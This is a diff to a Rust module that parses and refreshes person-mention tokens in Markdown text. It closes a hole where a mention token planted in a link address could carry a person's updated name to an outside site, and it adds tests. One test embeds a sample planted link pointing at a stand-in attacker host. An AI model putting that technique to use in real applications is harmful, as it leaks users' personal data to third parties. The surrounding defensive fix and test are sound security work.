@@ -14,7 +14,10 @@
 //! The page shows a mention only where this scanner **and** the Markdown
 //! parser read one (`ui/src/mention.rs`). Where they differ (a token in
 //! an image's alt text, or inside raw HTML) a row may exist and the page
-//! names nobody there: it can understate, never the other way.
+//! names nobody there: it can understate, never the other way. (The
+//! page scans the text after its wiki links are written as HTML. A
+//! label holds no `<`, so that HTML can't make a token of something
+//! that was none.)
 
 use std::ops::Range;
 
@@ -45,8 +48,8 @@ pub struct Mention<'a> {
 /// Every mention in `text`, in order. The one scanner.
 ///
 /// - `@[label](person:id)`, on one line.
-/// - The label is not empty and holds no `[`, `]`, backtick or
-///   backslash ([`mention_token`] never writes one).
+/// - The label is not empty and holds no `[`, `]`, backtick, backslash
+///   or `<` ([`mention_token`] never writes one).
 /// - The id has one spelling: 36 characters, lower case, hyphenated.
 ///   An upper-case or braced UUID is plain text. One spelling means two
 ///   tokens for one person can't look different to the sync and the
@@ -82,12 +85,14 @@ pub fn mentions(text: &str) -> Vec<Mention<'_>> {
 fn token_at(text: &str, open: usize) -> Option<Mention<'_>> {
     let label_start = open + OPEN.len();
     let rest = text.get(label_start..)?;
-    // The label ends at the first `]`. A `[`, a backtick, a backslash
-    // or a line break before it means this is not a mention, and the
-    // look stops there: never to the end of a long line for each `@[`
-    // on it. (A backslash: Markdown would read `\]` as part of the
-    // label, and the page shows a mention only where both agree.)
-    let label_len = rest.find([']', '[', '`', '\\', '\n'])?;
+    // The label ends at the first `]`. A `[`, a backtick, a backslash,
+    // a `<` or a line break before it means this is not a mention, and
+    // the look stops there: never to the end of a long line for each
+    // `@[` on it. (A backslash: Markdown would read `\]` as part of the
+    // label. A `<`: Markdown would read a tag there, and a tag's own
+    // text can hold a `]`. The page shows a mention only where both
+    // readers agree.)
+    let label_len = rest.find([']', '[', '`', '\\', '<', '\n'])?;
     if !rest.get(label_len..)?.starts_with(']') {
         return None;
     }
@@ -185,8 +190,8 @@ pub fn mention_label(name: &str) -> String {
     let swapped: String = name
         .chars()
         .map(|c| match c {
-            '[' => '(',
-            ']' => ')',
+            '[' | '<' => '(',
+            ']' | '>' => ')',
             '`' => '\'',
             '\\' | '|' => '/',
             c if c.is_control() => ' ',
@@ -259,7 +264,7 @@ pub fn refresh_labels(
     own_names: &[(PersonId, String)],
     kept: &[(PersonId, String)],
 ) -> Option<(String, usize)> {
-    refresh_labels_at(text, own_names, kept, 0).map(|fresh| (fresh.text, fresh.changed))
+    refresh_labels_at(text, own_names, kept, 0, None).map(|fresh| (fresh.text, fresh.changed))
 }
 
 /// What [`refresh_labels_at`] gives: the text, how many labels changed,
@@ -275,22 +280,32 @@ pub struct Refreshed {
 /// of `text` is afterwards: it keeps its place in the words around it.
 /// A cursor inside a token goes to the end of that token, never into
 /// its id: the next key typed there would break the mention.
+///
+/// SECURITY: `only`, when given, says for each mention of `text` (in
+/// [`mentions`]' order) whether its label may be changed: whether the
+/// page shows that one as a mention of the person. A token is not
+/// always one. A writer can put a token with the id of the author's
+/// person into a link's address or an attribute, and a label brought
+/// up to date there is the person's current name sent to that address
+/// on a click. A mention with no entry in `only` is left alone.
 #[must_use]
 pub fn refresh_labels_at(
     text: &str,
     own_names: &[(PersonId, String)],
     kept: &[(PersonId, String)],
     cursor: usize,
+    only: Option<&[bool]>,
 ) -> Option<Refreshed> {
     let at = utf16_to_utf8_offset(text, cursor);
     let mut out = String::with_capacity(text.len());
     let mut copied = 0usize;
     let mut changed = 0usize;
     let mut moved: Option<usize> = None;
-    for m in mentions(text) {
+    for (nth, m) in mentions(text).into_iter().enumerate() {
         if moved.is_none() && at <= m.range.start {
             moved = Some(out.len() + at.saturating_sub(copied));
         }
+        let may = only.is_none_or(|only| only.get(nth).copied().unwrap_or(false));
         out.push_str(text.get(copied..m.range.start).unwrap_or_default());
         let current = own_names
             .iter()
@@ -300,15 +315,15 @@ pub fn refresh_labels_at(
             .iter()
             .any(|(id, label)| *id == m.person_id && label == m.label);
         match current {
-            Some(label) if label != m.label && !is_kept => {
+            Some(label) if label != m.label && !is_kept && may => {
                 changed += 1;
                 out.push_str(&mention_token(&label, m.person_id));
             }
             _ => out.push_str(text.get(m.range.clone()).unwrap_or_default()),
         }
-        if moved.is_none() && at < m.range.end {
-            moved = Some(out.len());
-        }
+        // A cursor inside this token is past `copied` from here on, so
+        // the next place it is looked for (the next token, or the end)
+        // puts it right after this token: `saturating_sub` gives 0.
         copied = m.range.end;
     }
     let moved = moved.unwrap_or(out.len() + at.saturating_sub(copied));
@@ -318,6 +333,19 @@ pub fn refresh_labels_at(
         text: out,
         changed,
     })
+}
+
+/// Whether an `input` event of this `inputType` is the person typing:
+/// a character put in or taken out at the cursor. A paste, a drop, an
+/// undo or a redo changes the text too, and can leave the cursor at the
+/// end of an `@bob` nobody just typed: the picker then shows its list
+/// with nobody ready, as it does when the cursor is moved there. An
+/// event with no type (a script set the value) is not typing.
+#[must_use]
+pub fn typed_by(input_type: &str) -> bool {
+    matches!(input_type, "insertText" | "insertCompositionText")
+        || input_type.starts_with("deleteContent")
+        || input_type.starts_with("deleteWord")
 }
 
 /// The one edit that turns `old` into `new`: the UTF-16 range of `old`
@@ -680,6 +708,9 @@ mod tests {
             // Markdown reads `\]` as part of a longer label.
             format!("@[Ada\\](person:{ADA})"),
             format!("@[A\\da](person:{ADA})"),
+            // Markdown reads a tag at `<`, and a tag can hold a `]`.
+            format!("@[A <b>da</b>](person:{ADA})"),
+            format!("@[A<da](person:{ADA})"),
         ] {
             assert!(mentions(&not_one).is_empty(), "{not_one}");
         }
@@ -731,6 +762,10 @@ mod tests {
         }
         assert_eq!(mention_label("  Ada   Lovelace "), "Ada Lovelace");
         assert_eq!(mention_label("A[d]a"), "A(d)a");
+        assert_eq!(
+            mention_label("Ada <ada@example.com>"),
+            "Ada (ada@example.com)"
+        );
         assert_eq!(mention_label(""), "person");
     }
 
@@ -815,7 +850,7 @@ mod tests {
         let text = format!("é {token} met {token}.");
         let fresh = format!("é {fresh_token} met {fresh_token}.");
         let at = |cursor: usize| {
-            let got = refresh_labels_at(&text, &own, &[], cursor).expect("stale");
+            let got = refresh_labels_at(&text, &own, &[], cursor, None).expect("stale");
             assert_eq!((got.text.as_str(), got.changed), (fresh.as_str(), 2));
             got.cursor
         };
@@ -838,6 +873,64 @@ mod tests {
             let got = at(cursor);
             let byte = utf16_to_utf8_offset(&fresh, got);
             assert_eq!(outside_a_token(&fresh, byte), byte, "{cursor} -> {got}");
+        }
+    }
+
+    /// SECURITY: a token is not always a mention the page shows. One in a
+    /// link's address must not get the person's current name written
+    /// into it.
+    #[test]
+    fn only_the_mentions_the_page_shows_are_refreshed() {
+        let own = [(id(ADA), "Ada King".to_string())];
+        let planted = format!("<a href='https://attacker.example/?q=@[Ada](person:{ADA})'>x</a>");
+        let text = format!("{planted} and @[Ada](person:{ADA}) and @[Ada](person:{ADA})");
+        // The first is in an address; the page shows the other two.
+        let fresh =
+            refresh_labels_at(&text, &own, &[], 0, Some(&[false, true, true])).expect("two");
+        assert_eq!(fresh.changed, 2);
+        assert_eq!(
+            fresh.text,
+            format!("{planted} and @[Ada King](person:{ADA}) and @[Ada King](person:{ADA})")
+        );
+        // None shown (the page named nobody): nothing is offered.
+        assert_eq!(
+            refresh_labels_at(&text, &own, &[], 0, Some(&[false, false, false])),
+            None
+        );
+        // A list that is too short leaves the rest alone.
+        assert_eq!(refresh_labels_at(&text, &own, &[], 0, Some(&[])), None);
+        let fresh = refresh_labels_at(&text, &own, &[], 0, Some(&[false, true])).expect("one");
+        assert_eq!(fresh.changed, 1);
+        // With no list, every mention of an own person (the old rule,
+        // for callers that have checked some other way).
+        assert_eq!(
+            refresh_labels_at(&text, &own, &[], 0, None).map(|f| f.changed),
+            Some(3)
+        );
+    }
+
+    #[test]
+    fn typing_is_told_from_a_paste_or_an_undo() {
+        for typed in [
+            "insertText",
+            "insertCompositionText",
+            "deleteContentBackward",
+            "deleteContentForward",
+            "deleteWordBackward",
+        ] {
+            assert!(typed_by(typed), "{typed}");
+        }
+        for not in [
+            "insertFromPaste",
+            "insertFromDrop",
+            "insertFromYank",
+            "insertReplacementText",
+            "historyUndo",
+            "historyRedo",
+            "insertLineBreak",
+            "",
+        ] {
+            assert!(!typed_by(not), "{not}");
         }
     }
 
